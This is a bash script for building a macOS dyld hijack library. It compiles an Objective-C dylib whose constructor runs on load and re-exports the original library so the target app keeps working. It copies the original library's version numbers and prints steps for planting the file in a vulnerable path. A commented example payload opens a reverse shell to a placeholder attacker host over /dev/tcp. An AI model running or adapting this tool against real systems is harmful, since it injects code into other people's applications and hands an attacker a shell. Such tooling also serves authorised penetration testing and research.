#!/bin/bash
# Create a dyld hijack library with reexport

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <original_library_path> <hijack_location> [output_dylib]"
    echo "Example: $0 /path/to/original/lib.dylib /vulnerable/path/ hijack.dylib"
    exit 1
fi

ORIGINAL_LIB="$1"
HIJACK_LOCATION="$2"
OUTPUT_DYLIB="${3:-lib.dylib}"

# Create temporary directory for source
TMP_DIR=$(mktemp -d)
SOURCE_FILE="$TMP_DIR/lib.m"

cat > "$SOURCE_FILE" << 'EOF'
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    if (argc > 0 && argv[0]) {
        NSLog(@"[+] dylib hijacked in %s", argv[0]);
        
        // Add your payload here
        // Example: spawn shell
        // system("/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
    }
}
EOF

echo "=== Creating Hijack Dylib ==="
echo "Original Library: $ORIGINAL_LIB"
echo "Hijack Location: $HIJACK_LOCATION"
echo "Output: $OUTPUT_DYLIB"
echo ""

# Check if original library exists
if [ ! -f "$ORIGINAL_LIB" ]; then
    echo "Error: Original library not found at $ORIGINAL_LIB"
    rm -rf "$TMP_DIR"
    exit 1
fi

# Get version info from original library
echo "Extracting version info from original library..."
VERSION_INFO=$(otool -l "$ORIGINAL_LIB" | grep -A 2 "current version")
CURRENT_VERSION=$(echo "$VERSION_INFO" | grep "current version" | awk '{print $3}')
COMPAT_VERSION=$(echo "$VERSION_INFO" | grep "compatibility version" | awk '{print $3}')

echo "Current Version: $CURRENT_VERSION"
echo "Compatibility Version: $COMPAT_VERSION"

# Set defaults if not found
CURRENT_VERSION=${CURRENT_VERSION:-1.0}
COMPAT_VERSION=${COMPAT_VERSION:-1.0}

# Compile hijack library with reexport
echo ""
echo "Compiling hijack library..."
if gcc -dynamiclib \
    -current_version "$CURRENT_VERSION" \
    -compatibility_version "$COMPAT_VERSION" \
    -framework Foundation \
    "$SOURCE_FILE" \
    -Wl,-reexport_library,"$ORIGINAL_LIB" \
    -o "$OUTPUT_DYLIB" 2>&1; then
    
    echo "[+] Initial compilation successful"
    
    # Check reexport path
    echo ""
    echo "Checking reexport path..."
    REEXPORT_PATH=$(otool -l "$OUTPUT_DYLIB" | grep -A 2 "REEXPORT" | grep "name" | awk '{print $2}')
    echo "Current reexport path: $REEXPORT_PATH"
    
    # Fix reexport path to absolute
    if [[ "$REEXPORT_PATH" == @rpath/* ]] || [[ "$REEXPORT_PATH" == @loader_path/* ]]; then
        echo ""
        echo "Fixing reexport path to absolute..."
        if install_name_tool -change "$REEXPORT_PATH" "$ORIGINAL_LIB" "$OUTPUT_DYLIB" 2>&1; then
            echo "[+] Reexport path updated to: $ORIGINAL_LIB"
        else
            echo "[!] Failed to update reexport path"
        fi
    else
        echo "[+] Reexport path is already absolute"
    fi
    
    # Verify final library
    echo ""
    echo "=== Final Library Info ==="
    otool -l "$OUTPUT_DYLIB" | grep -A 2 "REEXPORT"
    
    echo ""
    echo "=== Deployment ==="
    echo "To deploy the hijack library:"
    echo "  cp $OUTPUT_DYLIB $HIJACK_LOCATION/"
    echo ""
    echo "Then execute the target binary to trigger the hijack."
    
else
    echo "[!] Failed to compile hijack library"
    rm -rf "$TMP_DIR"
    exit 1
fi

# Cleanup
rm -rf "$TMP_DIR"

echo ""
echo "=== Complete ==="
